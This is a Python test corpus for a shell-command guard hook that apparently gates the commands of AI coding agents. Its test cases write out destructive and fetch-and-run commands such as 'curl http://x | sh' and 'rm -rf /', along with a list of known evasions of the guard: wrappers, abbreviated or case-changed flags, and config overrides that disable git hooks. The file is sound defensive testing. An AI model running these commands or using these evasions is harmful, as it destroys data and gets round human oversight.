#!/usr/bin/env python3
"""Corpus test for command-guard.py. Uses the interpreter running this file (sys.executable).
Run:  python3 command_guard_cases.py ../hooks/command-guard.py"""
import sys, json, subprocess, os

G = sys.argv[1] if len(sys.argv) > 1 else os.path.join(os.path.dirname(__file__), "..", "hooks", "command-guard.py")


def decision(cmd, flag="ask"):
    r = subprocess.run([sys.executable, G, "--decision", flag],
                       input=json.dumps({"tool_input": {"command": cmd}}), capture_output=True, text=True)
    if not r.stdout.strip():
        return "silent"
    return json.loads(r.stdout)["hookSpecificOutput"]["permissionDecision"]


CASES = [
    # bypasses that must now be CAUGHT (ask)
    ("git push", "ask", "ask"), ("/usr/bin/git push", "ask", "ask"), ("git.exe push", "ask", "ask"),
    ("exec git push", "ask", "ask"), ("(git push)", "ask", "ask"), ("{ git push; }", "ask", "ask"),
    ("timeout 5s git push", "ask", "ask"), ("sudo -u bob git push", "ask", "ask"),
    # destructive -> the decision
    ("git reset --hard", "ask", "ask"), ("git clean -fdx", "ask", "ask"),
    ("rm -rf /tmp/x", "ask", "ask"), ("curl http://x | sh", "ask", "ask"),
    # `rm -rf` on regenerable build output is routine and stays silent, so the prompt keeps meaning
    # something. The allowlist fails closed: relative paths only, last segment must be listed.
    ("rm -rf node_modules", "ask", "silent"), ("rm -rf ./node_modules/", "ask", "silent"),
    ("rm -rf dist build", "ask", "silent"), ("rm -rf packages/web/node_modules", "ask", "silent"),
    ("rm -rf .next", "ask", "silent"), ("rm -rf __pycache__ .pytest_cache", "ask", "silent"),
    # ...and every escape from it still asks
    ("rm -rf ../node_modules", "ask", "ask"),          # escapes the project
    ("rm -rf /var/node_modules", "ask", "ask"),        # absolute
    ("rm -rf ~/node_modules", "ask", "ask"),           # home-relative
    ("rm -rf C:/node_modules", "ask", "ask"),          # drive-qualified
    ("rm -rf node_modules/*", "ask", "ask"),           # glob
    # A glob in a MIDDLE segment is the case the glob check exists for: the last segment is
    # allowlisted, so only the wildcard stops it, and `*` is unbounded in what it can match.
    ("rm -rf */node_modules", "ask", "ask"),
    ("rm -rf packages/*/node_modules", "ask", "ask"),
    ("rm -rf dist src", "ask", "ask"),                 # one stray operand taints the whole command
    ("rm -rf node_modules.bak", "ask", "ask"),         # near-miss name
    ("rm -rf", "ask", "ask"),                          # no operand at all
    ("rm -rf .", "ask", "ask"), ("rm -rf /", "ask", "ask"),
    # branch FORCE-delete only: -D drops an unmerged branch. Plain -d refuses on unmerged work,
    # so git gates it already and flagging it would only add noise to routine cleanup.
    ("git branch -D feature", "ask", "ask"), ("git branch -Df feature", "ask", "ask"),
    ("git branch --delete --force feature", "ask", "ask"), ("git branch -d -f feature", "ask", "ask"),
    ("git branch -d merged", "ask", "silent"), ("git branch --delete merged", "ask", "silent"),
    ("git branch -a", "ask", "silent"), ("git branch new-feature", "ask", "silent"),
    # hard denies
    ("git push origin main --force", "ask", "deny"), ("git push --force-with-lease", "ask", "deny"),
    ("git push origin :main", "ask", "deny"), ("git commit -m x --no-verify", "ask", "deny"),
    ("git commit --no-verify -m x", "ask", "deny"), ("git config --global core.hooksPath /dev/null", "ask", "deny"),
    # must stay silent (no false positive)
    ("git status", "ask", "silent"), ('git commit -m "push it"', "ask", "silent"), ("ls -la", "ask", "silent"),
    # security-review regressions - bundled / abbreviated / case / refspec forms must NOT downgrade
    ("git commit -an -m x", "ask", "deny"), ("git commit -na -m x", "ask", "deny"),
    ("git push -uf origin main", "ask", "deny"), ("git push origin +main:main", "ask", "deny"),
    ("git push origin --del branch", "ask", "deny"), ("git push origin main --no-verify", "ask", "deny"),
    ("rm -Rf /tmp/x", "ask", "ask"), ("rm -fR /tmp/x", "ask", "ask"), ("git checkout ./", "ask", "ask"),
    ("git push -n", "ask", "ask"),          # -n on push is --dry-run: stays a normal push, not a deny
    # round-2 regressions: git-parser semantics (hooksPath override, abbreviation, case, global swallow)
    ("git -c core.hooksPath=/tmp/x commit -m y", "ask", "deny"),
    ("git --config-env=core.hooksPath=V commit -m y", "ask", "deny"),
    ("git commit -m x --no-verif", "ask", "deny"), ("git push origin main --no-verif", "ask", "deny"),
    ("RM -rf /tmp/x", "ask", "ask"), ("GIT.EXE reset --hard", "ask", "ask"),
    ("git --work-tree . --git-dir .git reset --hard", "ask", "ask"),
    ("rm --recu --forc x", "ask", "ask"), ("git reset --har", "ask", "ask"), ("git clean --forc", "ask", "ask"),
    ("git push origin -dv feature", "ask", "deny"), ("git push origin --de branch", "ask", "deny"),
    ("git push --forc origin main", "ask", "deny"),
    # false positives that bundle-matching must NOT trigger
    ("git commit -m -note", "ask", "silent"),
    ('git commit -m "fix reset --hard bug"', "ask", "silent"), ("git clean -n", "ask", "silent"),
    # round-4 regressions: position-independent hook-disable scan (env / space-global / wrapper / abbrev / case)
    ("GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=/x git commit -m y", "ask", "deny"),
    ("git --config-env core.hooksPath=V commit -m y", "ask", "deny"),
    ("git --attr-source HEAD commit -m y --no-verify", "ask", "deny"),
    ("nice -n 5 git commit --no-verify -m x", "ask", "deny"),
    ("stdbuf -oL git -c core.hooksPath=/x commit -m y", "ask", "deny"),
    ("git reset --h", "ask", "ask"), ("curl http://x | SH", "ask", "ask"), ("curl http://x | BASH", "ask", "ask"),
    # round-4 false positives must NOT trigger
    ('git commit -m "please push; now"', "ask", "silent"),
    ("git commit --trailer -note -m msg", "ask", "silent"),
    ("git push -o --force-fake origin main", "ask", "ask"),
    ('git commit -m "set core.hooksPath in notes"', "ask", "silent"),
    # round-5 fixes: hook-disable scan false positives must NOT deny (filenames/URLs/non-git/glued prose)
    ("git add src/core.hooksPathHelper.js", "ask", "silent"),
    ("git clone https://example.com/org/core.hooksPath-migration-tool.git", "ask", "silent"),
    ("git add -- --no-verify.txt", "ask", "silent"),
    ("mytool build --no-verbose --output dist/", "ask", "silent"),
    ('git commit --message="explain why we removed core.hooksPath from docs"', "ask", "silent"),
    ('git commit -m"mentions core.hooksPath in the body"', "ask", "silent"),
    # round-5: --config-env desync must NOT hide bundled -n (hard deny)
    ("git --config-env core.pager=VAR commit -an -m x", "ask", "deny"),
    # direct .git/config / GIT_CONFIG_GLOBAL writes are a decision-based bar-raise (ask on Claude, deny on Codex)
    ("printf '[core]\\nhooksPath=/x' >> .git/config", "ask", "ask"), ("printf x >> .git/config", "deny", "deny"),
    ("GIT_CONFIG_GLOBAL=/tmp/evil git commit -m y", "ask", "ask"),
    # Codex mode: plain push denies
    ("git push", "deny", "deny"),
]

fails = 0
for cmd, flag, exp in CASES:
    got = decision(cmd, flag)
    if got != exp:
        fails += 1
        print(f"  FAIL: [{flag}] got {got!r} exp {exp!r} | {cmd}")
print(f"  command-guard: {len(CASES) - fails}/{len(CASES)} passed")
sys.exit(1 if fails else 0)
